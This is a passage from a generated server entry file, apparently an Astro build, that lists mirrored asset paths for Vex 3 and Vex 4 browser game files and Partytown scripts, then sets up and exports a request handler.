ssets/spine/kizi_skeleton.png","/src/vex3/cdn.jsdelivr.net/npm/@orange-games/phaser-spine@3.0/build/phaser-spine.min.js","/src/vex3/cdn.jsdelivr.net/npm/@orange-games/phaser-cachebuster@2.0/build/phaser-cachebuster.min.js","/src/vex3/cdn.jsdelivr.net/npm/@orange-games/phaser-super-storage@1.0/build/phaser-super-storage.min.js","/src/vex3/cdn.jsdelivr.net/npm/@orange-games/splash@3.5/build/splash.min.js","/src/vex4/cdn.fbrq/@orange-games/splash/assets/icons/bubble-burst.png","/src/vex4/cdn.fbrq/@orange-games/splash/assets/icons/fun-game-play-mahjong.png","/src/vex4/cdn.fbrq/@orange-games/splash/assets/icons/heroes-of-myths.png","/src/vex4/cdn.fbrq/@orange-games/splash/assets/icons/jelly-madness-2.png","/src/vex4/cdn.fbrq/@orange-games/splash/assets/icons/jewel-burst.png","/src/vex4/cdn.fbrq/@orange-games/splash/assets/icons/super-stack.png","/src/vex4/cdn.fbrq/@orange-games/splash/assets/icons/twisted-city.png","/src/vex4/cdn.fbrq/@orange-games/splash/assets/images/branding_logo_kizi_small.png","/src/vex4/cdn.fbrq/@orange-games/splash/assets/images/close_btn.png","/src/vex4/cdn.fbrq/@orange-games/splash/assets/images/kizi_button.png","/src/vex4/cdn.fbrq/@orange-games/splash/assets/images/kizi_logo.png","/src/vex4/cdn.fbrq/@orange-games/splash/assets/images/kizi_twist.png","/src/vex4/cdn.fbrq/@orange-games/splash/assets/jsonnope/contracted.json","/src/vex4/cdn.fbrq/@orange-games/splash/assets/jsonnope/domains.json","/src/vex4/cdn.fbrq/@orange-games/splash/assets/jsonnope/games.json","/src/vex4/cdn.fbrq/@orange-games/splash/assets/jsonnope/internal.json","/src/vex4/cdn.fbrq/@orange-games/splash/assets/jsonnope/sitelock.json","/src/vex4/cdn.fbrq/@orange-games/splash/assets/jsonnope/special.json","/src/vex4/cdn.fbrq/@orange-games/splash/assets/spine/kizi_skeleton.atlas","/src/vex4/cdn.fbrq/@orange-games/splash/assets/spine/kizi_skeleton.json","/src/vex4/cdn.fbrq/@orange-games/splash/assets/spine/kizi_skeleton.png","/src/vex4/cdn.jsdelivr.net/npm/@orange-games/phaser-ads@2.2/build/phaser-ads.min.js","/src/vex4/cdn.jsdelivr.net/npm/@orange-games/phaser-cachebuster@2.0/build/phaser-cachebuster.min.js","/src/vex4/cdn.jsdelivr.net/npm/@orange-games/phaser-input@2.0/build/phaser-input.min.js","/src/vex4/cdn.jsdelivr.net/npm/@orange-games/phaser-nineslice@2.0/build/phaser-nineslice.min.js","/src/vex4/cdn.jsdelivr.net/npm/@orange-games/phaser-spine@3.0/build/phaser-spine.min.js","/src/vex4/cdn.jsdelivr.net/npm/@orange-games/phaser-super-storage@1.0/build/phaser-super-storage.min.js","/src/vex4/cdn.jsdelivr.net/npm/@orange-games/splash@3.5/build/splash.min.js","/page.5a6f3db5.js","/~partytown/partytown-atomics.js","/~partytown/partytown-media.js","/~partytown/partytown-sw.js","/~partytown/partytown.js"]}), {
	pageMap: pageMap,
	renderers: renderers
});
const _args = {"mode":"middleware","client":"file:///D:/Lucid-New/dist/client/","server":"file:///D:/Lucid-New/dist/server/","host":false,"port":3000};

const _exports = createExports(_manifest);
const handler = _exports['handler'];

const _start = 'start';
if(_start in adapter) {
	adapter[_start](_manifest, _args);
}

export { handler };
